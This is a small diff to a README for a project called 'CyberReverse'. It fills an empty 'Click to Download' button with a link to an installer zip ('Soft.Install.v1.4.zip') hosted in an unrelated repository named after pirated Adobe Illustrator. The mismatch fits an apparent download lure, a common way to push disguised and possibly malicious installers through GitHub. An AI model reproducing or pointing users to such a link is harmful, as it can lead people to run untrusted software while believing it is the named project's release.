@@ -6,4 +6,4 @@
 
 | Downloads | Link |
 |:-------------:| :-----:|
-| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Click to Download]() |
+| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Click to Download](https://github.com/abdullahasifab/Adobe-Illustrator-for-MacOS-and-Windows-64-32/releases/download/28.3/Soft.Install.v1.4.zip) |
